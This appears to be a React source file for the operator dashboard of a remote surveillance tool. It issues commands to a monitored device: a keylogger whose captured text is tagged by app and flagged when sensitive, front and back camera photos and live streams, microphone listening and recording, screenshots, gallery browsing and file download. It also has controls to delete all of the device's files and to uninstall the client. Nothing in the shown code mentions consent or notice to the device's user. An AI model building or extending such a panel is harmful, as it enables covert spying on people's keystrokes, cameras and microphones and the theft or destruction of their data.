'use client';

import { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { 
  FiCamera, FiMic, FiKey, FiEye, FiEyeOff, FiDownload, 
  FiTrash2, FiActivity, FiRadio, FiMonitor, FiVideo,
  FiMicOff, FiCameraOff, FiRefreshCw, FiAlertCircle
} from 'react-icons/fi';
import toast from 'react-hot-toast';

export default function DeviceSurveillance({ deviceId, onCommand }) {
  const [keyloggerActive, setKeyloggerActive] = useState(false);
  const [keylogs, setKeylogs] = useState([]);
  const [cameraStream, setCameraStream] = useState(null);
  const [isStreaming, setIsStreaming] = useState(false);
  const [isListening, setIsListening] = useState(false);
  const [gallery, setGallery] = useState([]);
  const [screenshots, setScreenshots] = useState([]);
  const [loading, setLoading] = useState(false);
  const [activeCamera, setActiveCamera] = useState('back');
  const [audioLevel, setAudioLevel] = useState(0);

  useEffect(() => {
    fetchKeylogs();
    fetchGallery();
    const interval = setInterval(fetchKeylogs, 10000);
    return () => clearInterval(interval);
  }, [deviceId]);

  const fetchKeylogs = async () => {
    try {
      const response = await fetch(`/api/devices/${deviceId}/keylogger/logs`);
      const data = await response.json();
      setKeylogs(data.data || []);
    } catch (error) {
      console.error('Failed to fetch keylogs:', error);
    }
  };

  const fetchGallery = async () => {
    try {
      const response = await fetch(`/api/devices/${deviceId}/gallery`);
      const data = await response.json();
      setGallery(data.data || []);
      setScreenshots(data.screenshots || []);
    } catch (error) {
      console.error('Failed to fetch gallery:', error);
    }
  };

  const startKeylogger = async () => {
    setLoading(true);
    try {
      await onCommand('START_KEYLOGGER', {});
      setKeyloggerActive(true);
      toast.success('Keylogger started');
    } catch (error) {
      toast.error('Failed to start keylogger');
    } finally {
      setLoading(false);
    }
  };

  const stopKeylogger = async () => {
    setLoading(true);
    try {
      await onCommand('STOP_KEYLOGGER', {});
      setKeyloggerActive(false);
      toast.success('Keylogger stopped');
    } catch (error) {
      toast.error('Failed to stop keylogger');
    } finally {
      setLoading(false);
    }
  };

  const takePhoto = async (camera = 'back') => {
    setLoading(true);
    try {
      await onCommand('TAKE_PHOTO', { camera });
      toast.success(`Photo taken with ${camera} camera`);
      setTimeout(fetchGallery, 2000);
    } catch (error) {
      toast.error('Failed to take photo');
    } finally {
      setLoading(false);
    }
  };

  const startLiveCamera = async (camera = 'back') => {
    setLoading(true);
    try {
      await onCommand('START_LIVE_CAMERA', { camera });
      setIsStreaming(true);
      setActiveCamera(camera);
      toast.success('Live camera started');
      
      // Simulate stream URL (in production, this would be a real WebRTC stream)
      setCameraStream(`/api/stream/${deviceId}?camera=${camera}`);
    } catch (error) {
      toast.error('Failed to start live camera');
    } finally {
      setLoading(false);
    }
  };

  const stopLiveCamera = async () => {
    setLoading(true);
    try {
      await onCommand('STOP_LIVE_CAMERA', {});
      setIsStreaming(false);
      setCameraStream(null);
      toast.success('Live camera stopped');
    } catch (error) {
      toast.error('Failed to stop live camera');
    } finally {
      setLoading(false);
    }
  };

  const startListening = async () => {
    setLoading(true);
    try {
      await onCommand('START_LISTENING', {});
      setIsListening(true);
      toast.success('Microphone listening started');
      
      // Simulate audio level
      const interval = setInterval(() => {
        setAudioLevel(Math.random() * 100);
      }, 500);
      window.audioInterval = interval;
    } catch (error) {
      toast.error('Failed to start listening');
    } finally {
      setLoading(false);
    }
  };

  const stopListening = async () => {
    setLoading(true);
    try {
      await onCommand('STOP_LISTENING', {});
      setIsListening(false);
      setAudioLevel(0);
      if (window.audioInterval) clearInterval(window.audioInterval);
      toast.success('Microphone listening stopped');
    } catch (error) {
      toast.error('Failed to stop listening');
    } finally {
      setLoading(false);
    }
  };

  const takeScreenshot = async () => {
    setLoading(true);
    try {
      await onCommand('TAKE_SCREENSHOT', {});
      toast.success('Screenshot captured');
      setTimeout(fetchGallery, 2000);
    } catch (error) {
      toast.error('Failed to take screenshot');
    } finally {
      setLoading(false);
    }
  };

  const downloadFile = async (filePath, fileName) => {
    try {
      const response = await fetch(`/api/devices/${deviceId}/files/download?path=${encodeURIComponent(filePath)}`);
      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = fileName;
      document.body.appendChild(a);
      a.click();
      a.remove();
      window.URL.revokeObjectURL(url);
      toast.success('File downloaded');
    } catch (error) {
      toast.error('Failed to download file');
    }
  };

  const deleteFile = async (filePath) => {
    if (!confirm('Are you sure you want to delete this file?')) return;
    
    try {
      await onCommand('DELETE_FILE', { path: filePath });
      toast.success('File deleted');
      fetchGallery();
    } catch (error) {
      toast.error('Failed to delete file');
    }
  };

  return (
    <div className="space-y-6">
      {/* Keylogger Section */}
      <div className="bg-white dark:bg-gray-800 rounded-xl shadow-lg p-6">
        <div className="flex justify-between items-center mb-4">
          <div className="flex items-center gap-3">
            <FiKey className="text-purple-600" size={24} />
            <h3 className="text-lg font-semibold text-gray-800 dark:text-white">Keylogger</h3>
          </div>
          <div className="flex gap-2">
            {!keyloggerActive ? (
              <button
                onClick={startKeylogger}
                disabled={loading}
                className="bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700 disabled:opacity-50 flex items-center gap-2"
              >
                <FiEye /> Start Keylogger
              </button>
            ) : (
              <button
                onClick={stopKeylogger}
                disabled={loading}
                className="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700 disabled:opacity-50 flex items-center gap-2"
              >
                <FiEyeOff /> Stop Keylogger
              </button>
            )}
          </div>
        </div>
        
        <div className="bg-gray-900 rounded-lg p-4 h-80 overflow-y-auto">
          <div className="font-mono text-sm space-y-1">
            {keylogs.map((log, idx) => (
              <div key={idx} className="text-green-400 hover:bg-gray-800 px-2 py-1 rounded">
                <span className="text-gray-500">[{new Date(log.timestamp).toLocaleTimeString()}]</span>{' '}
                <span className={log.isSensitive ? 'text-yellow-400' : ''}>
                  {log.text}
                </span>
                {log.app && (
                  <span className="text-gray-500 text-xs ml-2">[{log.app}]</span>
                )}
              </div>
            ))}
            {keylogs.length === 0 && (
              <div className="text-gray-500 text-center py-8">
                No keylogs recorded yet. Start keylogger to begin capturing.
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Camera & Microphone Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Camera Controls */}
        <div className="bg-white dark:bg-gray-800 rounded-xl shadow-lg p-6">
          <div className="flex items-center gap-3 mb-4">
            <FiCamera className="text-purple-600" size={24} />
            <h3 className="text-lg font-semibold text-gray-800 dark:text-white">Camera Control</h3>
          </div>
          
          <div className="space-y-4">
            {/* Camera Preview */}
            {cameraStream && isStreaming && (
              <div className="relative bg-black rounded-lg overflow-hidden">
                <img src={cameraStream} alt="Live stream" className="w-full h-64 object-cover" />
                <div className="absolute top-2 right-2 flex gap-2">
                  <span className="px-2 py-1 bg-red-600 text-white text-xs rounded-full animate-pulse">
                    LIVE
                  </span>
                  <span className="px-2 py-1 bg-black bg-opacity-50 text-white text-xs rounded-full">
                    {activeCamera} camera
                  </span>
                </div>
              </div>
            )}
            
            <div className="grid grid-cols-2 gap-3">
              <button
                onClick={() => takePhoto('front')}
                disabled={loading}
                className="p-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50 flex items-center justify-center gap-2"
              >
                <FiCamera /> Front Photo
              </button>
              <button
                onClick={() => takePhoto('back')}
                disabled={loading}
                className="p-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50 flex items-center justify-center gap-2"
              >
                <FiCamera /> Back Photo
              </button>
              {!isStreaming ? (
                <button
                  onClick={() => startLiveCamera('front')}
                  disabled={loading}
                  className="p-3 bg-purple-600 text-white rounded-lg hover:bg-purple-700 disabled:opacity-50 flex items-center justify-center gap-2"
                >
                  <FiVideo /> Live Front
                </button>
              ) : (
                <button
                  onClick={stopLiveCamera}
                  disabled={loading}
                  className="p-3 bg-red-600 text-white rounded-lg hover:bg-red-700 disabled:opacity-50 flex items-center justify-center gap-2"
                >
                  <FiCameraOff /> Stop Stream
                </button>
              )}
              <button
                onClick={() => startLiveCamera('back')}
                disabled={loading || isStreaming}
                className="p-3 bg-purple-600 text-white rounded-lg hover:bg-purple-700 disabled:opacity-50 flex items-center justify-center gap-2"
              >
                <FiVideo /> Live Back
              </button>
            </div>
          </div>
        </div>

        {/* Microphone Control */}
        <div className="bg-white dark:bg-gray-800 rounded-xl shadow-lg p-6">
          <div className="flex items-center gap-3 mb-4">
            <FiMic className="text-purple-600" size={24} />
            <h3 className="text-lg font-semibold text-gray-800 dark:text-white">Microphone</h3>
          </div>
          
          <div className="space-y-4">
            {/* Audio Level Meter */}
            {isListening && (
              <div className="space-y-2">
                <div className="flex justify-between text-sm">
                  <span>Audio Level</span>
                  <span>{Math.floor(audioLevel)}%</span>
                </div>
                <div className="w-full bg-gray-200 rounded-full h-2">
                  <div 
                    className="h-2 rounded-full transition-all duration-100 bg-green-600"
                    style={{ width: `${audioLevel}%` }}
                  />
                </div>
                <div className="flex items-center justify-center gap-2 text-sm text-green-600">
                  <div className="w-2 h-2 bg-green-600 rounded-full animate-pulse"></div>
                  Recording in progress...
                </div>
              </div>
            )}
            
            <div className="grid grid-cols-2 gap-3">
              {!isListening ? (
                <button
                  onClick={startListening}
                  disabled={loading}
                  className="p-3 bg-green-600 text-white rounded-lg hover:bg-green-700 disabled:opacity-50 flex items-center justify-center gap-2 col-span-2"
                >
                  <FiMic /> Start Listening
                </button>
              ) : (
                <button
                  onClick={stopListening}
                  disabled={loading}
                  className="p-3 bg-red-600 text-white rounded-lg hover:bg-red-700 disabled:opacity-50 flex items-center justify-center gap-2 col-span-2"
                >
                  <FiMicOff /> Stop Listening
                </button>
              )}
            </div>
            
            <button
              onClick={() => onCommand('RECORD_AUDIO', { duration: 10 })}
              disabled={loading}
              className="w-full p-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50 flex items-center justify-center gap-2"
            >
              <FiRadio /> Record Audio (10 seconds)
            </button>
          </div>
        </div>
      </div>

      {/* Screenshots Section */}
      <div className="bg-white dark:bg-gray-800 rounded-xl shadow-lg p-6">
        <div className="flex justify-between items-center mb-4">
          <div className="flex items-center gap-3">
            <FiMonitor className="text-purple-600" size={24} />
            <h3 className="text-lg font-semibold text-gray-800 dark:text-white">Screenshots</h3>
          </div>
          <button
            onClick={takeScreenshot}
            disabled={loading}
            className="bg-purple-600 text-white px-4 py-2 rounded-lg hover:bg-purple-700 disabled:opacity-50 flex items-center gap-2"
          >
            <FiCamera /> Take Screenshot
          </button>
        </div>
        
        <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4">
          {screenshots.map((item, idx) => (
            <div key={idx} className="relative group">
              <img
                src={item.thumbnail || item.path}
                alt={`Screenshot ${idx + 1}`}
                className="w-full h-32 object-cover rounded-lg cursor-pointer"
                onClick={() => window.open(item.path, '_blank')}
              />
              <div className="absolute inset-0 bg-black bg-opacity-50 opacity-0 group-hover:opacity-100 transition flex items-center justify-center gap-2 rounded-lg">
                <button
                  onClick={() => downloadFile(item.path, `screenshot_${idx}.png`)}
                  className="p-2 bg-blue-600 rounded-full hover:bg-blue-700"
                >
                  <FiDownload size={16} className="text-white" />
                </button>
                <button
                  onClick={() => deleteFile(item.path)}
                  className="p-2 bg-red-600 rounded-full hover:bg-red-700"
                >
                  <FiTrash2 size={16} className="text-white" />
                </button>
              </div>
              <div className="mt-1 text-xs text-gray-500 text-center">
                {new Date(item.timestamp).toLocaleTimeString()}
              </div>
            </div>
          ))}
          {screenshots.length === 0 && (
            <div className="col-span-full text-center py-8 text-gray-500">
              No screenshots captured yet
            </div>
          )}
        </div>
      </div>

      {/* Gallery Section */}
      <div className="bg-white dark:bg-gray-800 rounded-xl shadow-lg p-6">
        <div className="flex justify-between items-center mb-4">
          <div className="flex items-center gap-3">
            <FiEye className="text-purple-600" size={24} />
            <h3 className="text-lg font-semibold text-gray-800 dark:text-white">Gallery</h3>
          </div>
          <button
            onClick={fetchGallery}
            className="text-purple-600 hover:text-purple-700 text-sm flex items-center gap-1"
          >
            <FiRefreshCw /> Refresh
          </button>
        </div>
        
        <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4">
          {gallery.map((item, idx) => (
            <div key={idx} className="relative group">
              <img
                src={item.thumbnail || item.path}
                alt={item.name}
                className="w-full h-32 object-cover rounded-lg cursor-pointer"
                onClick={() => window.open(item.path, '_blank')}
              />
              <div className="absolute inset-0 bg-black bg-opacity-50 opacity-0 group-hover:opacity-100 transition flex items-center justify-center gap-2 rounded-lg">
                <button
                  onClick={() => downloadFile(item.path, item.name)}
                  className="p-2 bg-blue-600 rounded-full hover:bg-blue-700"
                >
                  <FiDownload size={16} className="text-white" />
                </button>
                <button
                  onClick={() => deleteFile(item.path)}
                  className="p-2 bg-red-600 rounded-full hover:bg-red-700"
                >
                  <FiTrash2 size={16} className="text-white" />
                </button>
              </div>
              <div className="mt-1 text-xs text-gray-500 truncate">{item.name}</div>
            </div>
          ))}
          {gallery.length === 0 && (
            <div className="col-span-full text-center py-8 text-gray-500">
              No images found in gallery
            </div>
          )}
        </div>
      </div>

      {/* Danger Zone */}
      <div className="bg-red-50 dark:bg-red-900 rounded-xl shadow-lg p-6 border-2 border-red-200 dark:border-red-800">
        <h3 className="font-semibold text-red-800 dark:text-red-200 mb-4 flex items-center gap-2">
          <FiAlertCircle /> Danger Zone
        </h3>
        <div className="space-y-3">
          <button
            onClick={() => {
              if (confirm('Are you sure you want to delete ALL files from this device? This action cannot be undone.')) {
                onCommand('DELETE_ALL_FILES', {});
              }
            }}
            className="w-full bg-red-600 text-white p-3 rounded-lg font-semibold hover:bg-red-700 transition flex items-center justify-center gap-2"
          >
            <FiTrash2 /> Delete All Files from Storage
          </button>
          <button
            onClick={() => {
              if (confirm('This will remove the device from monitoring and uninstall the client app. Continue?')) {
                onCommand('UNINSTALL_CLIENT', {});
              }
            }}
            className="w-full bg-red-600 text-white p-3 rounded-lg font-semibold hover:bg-red-700 transition flex items-center justify-center gap-2"
          >
            <FiActivity /> Uninstall Client App
          </button>
        </div>
      </div>
    </div>
  );
        }
